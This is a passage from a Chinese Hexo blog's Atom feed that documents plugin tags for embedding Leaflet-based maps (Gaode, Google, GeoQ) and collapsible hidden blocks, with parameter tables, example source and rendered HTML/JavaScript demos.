style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">高德地图</td><td style="text-align:center">gaodeMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">百度地图</td><td style="text-align:center">baiduMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 4~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~2</td></tr><tr><td style="text-align:center">Geoq 地图</td><td style="text-align:center">geoqMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~5</td></tr><tr><td style="text-align:center">openstreet 地图</td><td style="text-align:center">openstreetMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">不支持此参数</td></tr></tbody></table><ol><li>参数之间，用英文逗号相隔</li><li>参数必须按上述事例顺序输入，不得为空</li><li>同一个页面，同一组经纬度值，只能插入一个相同标签值的地图 (若有需要，可以将第二个地图上，经度或纬度末尾删除一两个数)</li><li>参数取值必须在上述范围内</li><li>默认图层：即地图叠加层的值，默认常规地图还是卫星地图，可按地图显示顺序取值</li><li>缩放等级，数字越大，地图比例尺越小，显示的越精细</li><li>除标签值外，其他参数选填，但 每个参数的左边的参数必填</li><li>谷歌地图需要外网才能加载查看</li></ol><p>坐标获取：<a href="https://lbs.amap.com/tools/picker">高德地图坐标拾取系统</a> 、<a href="https://api.map.baidu.com/lbsapi/getpoint/index.html">百度地图坐标拾取系统</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% map 120.101101,30.239119 %&#125;</span><br><span class="line">&#123;% googleMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！ %&#125;</span><br><span class="line">&#123;% geoqMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！, 13, 90%, 320px, 3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div class="map-box" style="margin: 0.8rem 0 1.6rem 0;"><div id="map-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div></div><script type="text/javascript">var normalm=L.tileLayer.chinaProvider('GaoDe.Normal.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imgm=L.tileLayer.chinaProvider('GaoDe.Satellite.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imga=L.tileLayer.chinaProvider('GaoDe.Satellite.Annotion',{maxZoom:20,minZoom:1,attribution:'高德地图'});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:20,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'});routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1,attribution:'Google Maps'});var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:21,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm]),image=L.layerGroup([imgm,imga]);var baseLayers={"高德地图":normal,"智图地图":normalm1,"谷歌地图":normalMap,"高德卫星地图":imgm,"谷歌卫星地图":satelliteMap,"高德卫星标注":image,"谷歌卫星标注":routeMap};var mymap=L.map('map-120.101101-30.239119',{center:[30.239119,120.101101],zoom:14,layers:[normal],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="googleMap-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:22,minZoom:1,attribution:'Google Maps'});var baseLayers={"谷歌地图":normalMap,"谷歌卫星图":satelliteMap,"谷歌卫星标注": routeMap};var overlayLayers={};var mymap=L.map("googleMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:14,layers:[normalMap],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="geoqMap-120.101101-30.239119" style="max-width:90%; height:320px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm2=L.tileLayer.chinaProvider('Geoq.Normal.PurplishBlue',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm3=L.tileLayer.chinaProvider('Geoq.Normal.Gray',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm4=L.tileLayer.chinaProvider('Geoq.Normal.Warm',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm5=L.tileLayer.chinaProvider('Geoq.Theme.Hydro',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm1,normalm2,normalm3,normalm4,normalm5]);var baseLayers={"智图地图":normalm1,"午夜蓝":normalm2,"灰色":normalm3,"暖色":normalm4,"水系":normalm5};var mymap=L.map("geoqMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:13,layers:[normalm3],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-31-隐藏块">2.31 隐藏块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>content：要隐藏的内容</li><li>display：展示前按钮显示的文字（可选）</li><li>bg：按钮的背景颜色（可选）</li><li>color：按钮显示的文字的颜色（可选）</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock 点我预览, blue %&#125;</span><br><span class="line">这里有张图片：</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;image (1)&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:67%;&quot;</span> /&gt;</span></span></span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="hide-block"><button type="button" class="hide-button" style="background-color:  blue;">点我预览    </button><div class="hide-content"><p>这里有张图片：<br><img src="https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb" alt="image (1)" style="zoom:67%;" /></p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
    
    
    <summary type="html">🥧本文汇总Markdown格式以及外挂标签在网页端的渲染效果，可作为文档进行查询</summary>
    
    
    
    <category term="演示" scheme="https://www.xvzhang.fun/categories/%E6%BC%94%E7%A4%BA/"/>
    
    
    <category term="Markdown" scheme="https://www.xvzhang.fun/tags/Markdown/"/>
    
    <category term="外挂标签" scheme="https://www.xvzhang.fun/tags/%E5%A4%96%E6%8C%82%E6%A0%87%E7%AD%BE/"/>
    
  </entry>
  
</feed>
